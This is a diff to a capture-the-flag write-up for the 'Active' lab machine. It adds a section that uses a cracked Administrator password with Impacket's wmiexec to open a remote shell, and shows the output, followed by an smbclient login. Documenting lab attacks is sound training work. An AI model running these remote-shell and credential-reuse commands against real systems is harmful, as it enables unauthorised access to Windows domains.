@@ -372,6 +372,20 @@ $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$39833e43716b6374
 
 ## **Login as Administrator**
 
+### **wmiexec**
+
+```bash
+wmiexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
+Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
+[*] SMBv2.1 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+active\administrator
+```
+
+### **smbclient**
+
 ```bash
 ┌─[us-dedivip-1]─[10.10.14.63]─[lemagickonch@htb-qseth8qvyk]─[~/Desktop]
 └──╼ [★]$ smbclient -U "Administrator%Ticketmaster1968" \\\\10.129.38.174\\Users
